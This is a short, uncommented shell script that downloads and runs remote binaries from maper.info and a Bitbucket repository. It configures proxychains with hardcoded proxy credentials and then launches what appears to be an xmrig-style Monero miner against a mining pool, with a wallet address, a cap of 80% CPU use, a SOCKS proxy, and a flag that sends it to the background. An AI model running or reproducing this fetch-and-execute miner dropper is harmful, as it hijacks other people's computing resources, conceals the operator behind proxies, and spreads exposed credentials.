proxy="34.192.31.89" 
port="1080" 
user="fixie"  
pass="lLksrNManrfYi2E" 
wget -q -O api https://maper.info/Credit && chmod +x api >/dev/null 2>&1
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./api -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 --cpu-max-threads-hint=80 -x socks5://192.252.209.155:14455 -k -s -B 
